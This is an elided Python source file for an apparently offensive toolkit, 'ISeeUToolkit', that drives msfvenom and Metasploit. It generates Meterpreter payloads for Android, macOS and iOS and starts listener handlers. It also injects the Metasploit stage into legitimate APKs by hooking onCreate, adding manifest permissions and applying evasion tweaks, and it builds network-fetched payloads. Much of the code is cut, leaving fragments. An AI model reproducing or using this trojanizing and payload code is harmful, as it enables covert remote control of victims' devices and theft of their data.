...
class ISeeUToolkit:
    ...
    def __init__(self):
        ...
        self.payload_configs = {
            ...
            "android": {
                ...
                # Android payloads build a full APK container
                "formats": ["apk"]
            },
            "macos": {
                "meterpreter": {
            ...
            "ios": {
                # Modern Metasploit only ships apple_ios payload names; staged apple_ios
                # needs Xcode, so both staged/non-staged use the valid stageless name.
                "meterpreter": {
                    "staged": {
    ...
    def check_android_tools(self) -> None:
        ...
        apktool counts as available only when it actually runs; a broken
        wrapper without its jar is reported missing so it gets reinstalled.
        """
        apk_ok = False
        if shutil.which("apktool") is not None:
            try:
                ...
                logger.warning(f"apktool binary found but failed to run (jar missing?)")
    ...
    def android_tools_ready(self) -> bool:
        """Return True if APK injection tools are present (zipalign optional)."""
        self.check_android_tools()
        required = ["apktool", "keytool", "jarsigner"]
        return all(self.tools_available.get(t, False) for t in required)
    
    def check_apktool_runs(self) -> bool:
        """True if apktool is on PATH and actually runs (jar present)."""
    ...
    def _install_latest_apktool(self) -> bool:
        """Download the latest apktool (jar + wrapper) from GitHub Releases."""
        try:
            import urllib.request
            print(f"{Colors.CYAN}Downloading latest apktool from GitHub...{Colors.END}")
            ...
            if not tag:
                logger.error("Could not determine latest apktool version")
                return False
            version = tag.lstrip("v")
            print(f"{Colors.CYAN}Latest apktool version: {version}{Colors.END}")
            ...
            for asset in release.get("assets", []) or []:
                ...
                if name.startswith("apktool_") and name.endswith(".jar"):
                    ...
                    break
            if not jar_url:
                jar_url = f"https://github.com/iBotPeaches/Apktool/releases/download/{tag}/apktool_{version}.jar"
            ...
            jar_path = f"{tmp}/apktool.jar"
            wrapper_path = f"{tmp}/apktool"

            print(f"{Colors.CYAN}Downloading {jar_url} ...{Colors.END}")
            ...
            if magic != b"PK\x03\x04":
                logger.error(f"Downloaded apktool.jar is not a valid JAR (magic: {magic!r})")
                shutil.rmtree(tmp, ignore_errors=True)
                return False
            if os.path.getsize(jar_path) < 100000:
                logger.error(f"Downloaded apktool.jar too small ({os.path.getsize(jar_path)} bytes)")
                shutil.rmtree(tmp, ignore_errors=True)
                return False

            print(f"{Colors.CYAN}Downloading {wrapper_url} ...{Colors.END}")
            ...
            sudo = [] if self._is_root() else ["sudo"]
            subprocess.check_call(sudo + ["cp", jar_path, "/usr/local/bin/apktool.jar"])
            subprocess.check_call(sudo + ["cp", wrapper_path, "/usr/local/bin/apktool"])
            subprocess.check_call(sudo + ["chmod", "+x", "/usr/local/bin/apktool"])
            shutil.rmtree(tmp, ignore_errors=True)
            ...
            try:
                ...
                subprocess.check_call(sudo + ["chmod", "+x", "/usr/local/bin/apktool.jar"])
            return True
        except Exception as e:
            logger.error(f"Failed to download latest apktool: {e}")
            return False
    ...
    def install_android_tools(self) -> bool:
        """Try to auto-install the Android toolchain (JDK + zipalign + latest apktool)."""
        # zipalign is optional: it only powers the alignment step which already
        # falls back to copying the signed APK when zipalign is absent.
        needed = ["apktool", "keytool", "jarsigner"]
        missing = [t for t in needed if shutil.which(t) is None]
        zipalign_missing = shutil.which("zipalign") is None
        if not missing and self.check_apktool_runs() and not zipalign_missing:
            return True
        if missing:
            print(f"{Colors.YELLOW}Installing missing Android tools: {', '.join(missing)} (may ask for sudo)...{Colors.END}")
        else:
            print(f"{Colors.YELLOW}Installing missing optional tool: zipalign (may ask for sudo)...{Colors.END}")
        
        # 1) Base JDK + zipalign + sqlite via apt
        try:
            apt = "apt-get" if shutil.which("apt-get") is not None else "apt"
            sudo = [] if self._is_root() else ["sudo"]
            subprocess.check_call(sudo + [apt, "update", "-qq"])
            subprocess.check_call(sudo + [apt, "install", "-y",
                                          "default-jdk-headless", "zipalign",
                                          "sqlite3", "libsqlite3-dev", "wget", "curl"])
        except Exception as e:
            logger.error(f"apt install of base tools failed: {e}")
        ...
        if shutil.which("zipalign") is None:
            for pkg in ("zipalign", "android-sdk-build-tools", "android-sdk-lib-dx"):
                try:
                    ...
                    logger.error(f"apt install {pkg} failed: {e}")
        ...
        if shutil.which("zipalign") is None:
            ...
            for cand in candidates:
                if os.path.isfile(cand) and os.access(cand, os.X_OK):
                    try:
                        sudo = [] if self._is_root() else ["sudo"]
                        subprocess.check_call(sudo + ["ln", "-sf", cand, "/usr/local/bin/zipalign"])
                    except Exception as e:
                        logger.error(f"symlink zipalign failed: {e}")
                    if shutil.which("zipalign") is not None:
                        print(f"{Colors.GREEN}✅ zipalign found and linked from {cand}{Colors.END}")
                        break
        
        # 2) apktool: prefer latest from GitHub (apt build is outdated), fall back to apt
        if not self.check_apktool_runs():
            if not self._install_latest_apktool():
                try:
                    apt = "apt-get" if shutil.which("apt-get") is not None else "apt"
                    sudo = [] if self._is_root() else ["sudo"]
                    subprocess.check_call(sudo + [apt, "install", "-y", "apktool"])
                except Exception as e:
                    logger.error(f"apt apktool install failed: {e}")
        
        self.check_android_tools()
        return self.android_tools_ready()
    
    def output_dir_for(self, platform: str = "") -> str:
        """Return a per-platform output directory, creating it if needed."""
        sub = platform if platform else "misc"
        path = f"{self.output_dir}/{sub}"
        try:
        ...
        try:
            ...
            try:
                ...
                try:
                    ...
                    pass
                return getattr(self, 'config', {}).get('default_lhost', '192.168.1.100')
...
# Default configuration
    ...
    def start_metasploit_handler_background(self, payload: str, lhost: str, lport: str) -> bool:
        ...
        try:
            ...
            logger.info(f"Starting Metasploit handler in background: {' '.join(msf_cmd)}")
    ...
    def generate_traditional_payload(self) -> None:
        ...
        # FIXED: For Android platform, msfvenom auto-produces an APK when given .apk
        # output; passing -f apk is NOT valid and fails with exit status 2.
        out_dir = self.output_dir_for(platform)
        if platform == "android":
            output_file = f"{out_dir}/{user_inputs['payload_name']}.apk"
            print(f"\n{Colors.CYAN}Note: For Android payloads, using APK format{Colors.END}")
        else:
            # For non-Android platforms, use the selected format
            cmd_parts.extend(["-f", output_format])
            output_file = f"{out_dir}/{user_inputs['payload_name']}.{output_format}"
        ...
        if self.execute_command(command):
            ...
            # Ask if user wants to start handler (auto-start if enabled)
            if self.config.get('auto_start_handler', True):
    ...
    def generate_injected_android_payload(self) -> None:
        ...
        if missing_tools:
            ...
            install = input(f"{Colors.WHITE}Try to install automatically? (y/N): {Colors.END}").strip().lower()
            if install == 'y':
                if self.install_android_tools():
                    print(f"{Colors.GREEN}✅ Android tools installed!{Colors.END}")
                else:
                    print(f"{Colors.RED}❌ Installation failed. Please install manually:{Colors.END}")
                    print(f"{Colors.YELLOW}sudo apt-get install apktool zipalign default-jdk-headless{Colors.END}")
                    input(f"\n{Colors.WHITE}Press Enter to continue...{Colors.END}")
                    return
            else:
        ...
        with tempfile.TemporaryDirectory() as temp_dir:
            ...
            # Step 6.5: Apply target SDK and evasion workarounds
            print(f"\n{Colors.YELLOW}Step 6.5: Applying target SDK workarounds...{Colors.END}")
            target_sdk = self.config.get("android_settings", {}).get("target_sdk", "android_11")
            evasion = self.config.get("android_settings", {}).get("evasion_technique", "apk_wrapper")
            self.apply_android_workarounds(str(legit_src), target_sdk, evasion)
            ...
            final_apk = Path(self.output_dir_for("android")) / f"{user_inputs['payload_name']}.apk"
    ...
    def inject_payload_startup(self, smali_path: Path) -> bool:
        ...
        try:
            ...
            # Find the onCreate method (public/protected/private)
            ...
            if "Lcom/metasploit/stage/Payload;->start" in content:
                print(f"{Colors.YELLOW}⚠️ Payload already injected into {smali_path}{Colors.END}")
                return True
    ...
    def modify_android_manifest(self, manifest_path: Path, permissions: List[str]) -> bool:
        ...
        try:
            ...
            # permissions arg may contain group names OR concrete permission strings
            for entry in permissions:
                if entry in self.android_configs["permissions"]:
                    for perm_name in self.android_configs["permissions"][entry]:
                        add_permission(perm_name)
                elif entry.startswith("android.permission."):
    ...
    def generate_fetch_payload(self) -> None:
        ...
        try:
            fetch_srvhost = self.sanitize_input(fetch_srvhost, "host")
        except ValueError as e:
            print(f"{Colors.RED}Error: {e}{Colors.END}")
            return
        ...
        if not fetch_srvport:
            fetch_srvport = "8080"
        try:
            fetch_srvport = self.sanitize_input(fetch_srvport, "port")
        except ValueError as e:
            print(f"{Colors.RED}Error: {e}{Colors.END}")
            return
        ...
        out_dir = self.output_dir_for(platform)
        output_file = f"{out_dir}/{user_inputs['payload_name']}.bin"
        command = (
    ...
    def generate_multi_format_payload(self) -> None:
        ...
        formats = configs["formats"]
        out_dir = self.output_dir_for(platform)
        print(f"\n{Colors.CYAN}Generating payload in {len(formats)} formats into {out_dir}...{Colors.END}")
        ...
        for fmt in formats:
            ...
            if platform == "android":
                ...
                output_file = f"{out_dir}/{user_inputs['payload_name']}.{fmt}"
            cmd_parts.extend(["-o", output_file])
    ...
    def apply_android_workarounds(self, payload_file: str, target_sdk: str, evasion: str) -> str:
        ...
        apk_src = Path(payload_file)
        apktool_yml = apk_src / "apktool.yml"
        if apk_src.is_dir() and apktool_yml.exists():
            try:
                ...
                if sdk_num:
                    ...
                    if re.search(r'targetSdkVersion:\s*\d+', content):
                        content = re.sub(
                            ...
                            f'targetSdkVersion: {sdk_num}',
                            content
                        )
                    else:
                        content = re.sub(
                            r'(minSdkVersion:\s*\d+)',
                            lambda m: m.group(1) + f"\n    targetSdkVersion: {sdk_num}",
                            content
                        )
                    apktool_yml.write_text(content)
                    print(f"{Colors.GREEN}✅ Set target SDK to {sdk_num} (Android {sdk_num - 14}) in apktool.yml{Colors.END}")
            except Exception as e:
                logger.warning(f"Could not update target SDK: {e}")
        else:
    ...
    def execute_command(self, command: str) -> bool:
        ...
        try:
            ...
            print(f"{Colors.CYAN}Command: {Colors.END}{Colors.YELLOW}{command}{Colors.END}")
